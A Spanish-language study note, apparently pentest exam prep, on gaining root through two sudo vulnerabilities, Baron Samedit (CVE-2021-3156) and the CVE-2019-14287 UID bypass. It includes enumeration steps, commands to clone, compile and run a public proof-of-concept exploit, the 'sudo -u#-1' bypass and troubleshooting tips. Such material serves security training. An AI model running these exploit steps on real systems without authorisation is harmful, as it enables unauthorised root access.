---
tags:
  - linux
  - privex
  - sudo
  - cve
---
## Conceptos Clave (TL;DR)

- `sudo` ejecuta procesos con privilegios de otro usuario (por defecto root). El fichero `/etc/sudoers` define QUIÉN puede ejecutar QUÉ comando y como quién (campo RunAs, ej. `(ALL:ALL)`).
- **CVE-2021-3156 (Baron Samedit):** heap-based buffer overflow vía `sudoedit`. Da root directo. Afecta versiones legacy (< 1.9.5p2): 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33), entre otras. Estuvo presente ~10 años sin detectarse.
- **CVE-2019-14287 (Policy Bypass):** afecta versiones < 1.8.28. Si el usuario puede ejecutar un comando con RunAs `ALL`, pasar un UID negativo (`-u#-1`) se procesa como UID 0 = root. Bypass de una sola línea, sin necesidad de exploit binario.
- Flujo siempre igual: primero enumerar versión (`sudo -V`) y permisos (`sudo -l`), luego decidir qué vector aplica.

## Herramientas Clave

- `sudo -l` / `sudo -V`: enumeración de permisos concedidos y versión instalada (paso de detección y elección de CVE).
- `blasty/CVE-2021-3156` (PoC en GitHub): exploit compilable para Baron Samedit con targets predefinidos.
- `make` / `gcc`: compilación del PoC directamente en el target (o en una copia idéntica del sistema).
- `/etc/sudoers`, `/etc/lsb-release`, `/etc/passwd`: ficheros de enumeración para política de sudo, fingerprint de SO/versión y resolución de UIDs.

## Metodología Paso a Paso

### Fase 1 - Enumeración (común a ambos vectores)
1. **Versión de sudo:** determina qué CVE aplica. < 1.8.28 -> Policy Bypass; versiones del listado Baron Samedit -> heap overflow.
2. **`sudo -l`:** muestra qué comandos puedo correr y, sobre todo, el RunAs. Si aparece `ALL` en RunAs, CVE-2019-14287 es candidato inmediato.
3. **Leer `/etc/sudoers`** (si tengo acceso): entender Defaults y la política completa.
4. **Fingerprint del SO** (`/etc/lsb-release`): imprescindible para elegir el `<TARGET_ID>` correcto en el PoC de Baron Samedit (depende de offsets de libc).

### Fase 2 - CVE-2021-3156 (Baron Samedit)
Lógica: el bug está en cómo `sudoedit` parsea argumentos con una barra invertida final, provocando un overflow en el heap que permite sobrescribir estructuras y obtener root. El PoC automatiza el cálculo de offsets para SOs concretos.
1. Confirmar que la versión cae dentro del rango vulnerable.
2. Clonar y compilar el PoC en el propio target (los offsets dependen de la libc local).
3. Listar targets soportados y mapear el SO detectado en Fase 1 a un ID.
4. Lanzar con ese ID -> rootshell.

### Fase 3 - CVE-2019-14287 (Policy Bypass)
Lógica: sudo resuelve el UID `-1` (o su equivalente unsigned) como `0`. Si la política permite ejecutar como cualquier usuario (`ALL`), saltarse la restricción de root es trivial.
1. Confirmar con `sudo -l` que el RunAs contiene `ALL`.
2. (Opcional/informativo) Verificar el UID del usuario en `/etc/passwd`.
3. Ejecutar el binario permitido con `-u#-1` -> se corre como root.

## Cheat Sheet de Comandos

> Placeholders a sustituir en el examen:
> `<USER>` = usuario comprometido. `<TARGET_ID>` = índice del target en el PoC.
> NOTA: en `-u#-1` el `-1` es LITERAL (es el exploit), NO un placeholder.

### Enumeración
```bash
# Volcar la politica de sudo filtrando ruido
# grep -v "#"          -> -v invierte el match, descarta lineas comentadas
# sed -r '/^\s*$/d'    -> -r regex extendida; borra (d) lineas vacias o con solo espacios
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'

# Mostrar SOLO la version de sudo (para decidir el CVE)
# -V imprime version e info de compilacion; head -n1 -> primera linea
sudo -V | head -n1

# Listar comandos ejecutables via sudo por el usuario actual y su RunAs
sudo -l
```

### CVE-2021-3156 (Baron Samedit)
```bash
# Clonar el PoC de blasty
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156

# Compilar (genera el binario sudo-hax-me-a-sandwich + la libreria maliciosa)
# IMPORTANTE: compilar en el target o en una copia identica (offsets de libc)
make

# Listar targets soportados por el PoC (cada uno = un set de offsets concreto)
./sudo-hax-me-a-sandwich

# Identificar la version exacta del SO para mapearla a un target ID
cat /etc/lsb-release

# Lanzar el exploit contra el ID elegido (en el ejemplo, 1 = Ubuntu 20.04.1)
# Sustituir <TARGET_ID> por el indice mostrado en la lista de targets
./sudo-hax-me-a-sandwich <TARGET_ID>

# Modo manual (si tu SO/libc NO esta en la lista): ajuste fino de offsets
./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

### CVE-2019-14287 (Policy Bypass)
```bash
# Confirmar que el RunAs permite ejecutar como ALL (prerrequisito del bug)
sudo -l

# Obtener el UID del usuario (informativo; confirma la cuenta en passwd)
# Sustituir <USER> por el usuario comprometido
cat /etc/passwd | grep <USER>

# EXPLOIT: -u#-1 fuerza ejecucion como UID -1 -> wrap a UID 0 (root)
# Se ejecuta el binario que sudoers ya permite (aqui 'id'), pero como root
sudo -u#-1 id

# Variante equivalente si "-1" no funciona: UID unsigned maximo (tambien resuelve a 0)
sudo -u#4294967295 id
```

## "Gotchas" y Troubleshooting

- **Versiones Baron Samedit:** confirmadas 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33) y otras. Es heap overflow vía `sudoedit`, no vía la config de sudoers.
- **El PoC de blasty solo trae 3 targets predefinidos** (Ubuntu 18.04.5, Ubuntu 20.04.1, Debian 10.0). Si el SO/libc no coincide EXACTAMENTE, el exploit suele crashear sin shell. Opciones: usar el modo manual con offsets, o cambiar a un PoC que brute-forcee offsets (ej. `worawit/CVE-2021-3156`).
- **Compilar en el target o copia idéntica:** el exploit depende de offsets de libc concretos. Compilar en otra máquina con distinta libc puede no funcionar.
- **Check de detección no destructivo (Baron Samedit):** `sudoedit -s /` -> si el error empieza por `sudoedit:` es vulnerable; si empieza por `usage:` está parcheado.
- **Prerrequisito CVE-2019-14287:** el RunAs en sudoers DEBE contener `ALL` (configuración típica de demo: `(ALL, !root)`, el bug salta el `!root`). Si la entrada está restringida a un usuario concreto (ej. `(root)` o un usuario fijo), el truco `-u#-1` NO escala.
- **Solo ejecutas el binario permitido (como root):** si `sudo -l` solo concede `id`, corres `id` como root, no un shell. Para shell completo el binario permitido debe permitir escape -> revisar GTFOBins (vim, less, awk, find, nmap, etc.).
- **Lectura del output del bypass:** tras `-u#-1` verás `uid=0(root)` pero el `gid` puede seguir siendo el del usuario original (ej. `gid=1005`). Sigues siendo root igualmente; no es un fallo.
- **Negative UID:** `-1` y `4294967295` (representación unsigned) resuelven ambos a UID 0; probar la variante si una no funciona.
- **Defaults relevantes en sudoers:** `secure_path` (PATH fijo para sudo) y `use_pty` (fuerza pty). No rompen estos dos exploits, pero condicionan otros vectores de sudo (ej. abuso de PATH/LD_PRELOAD).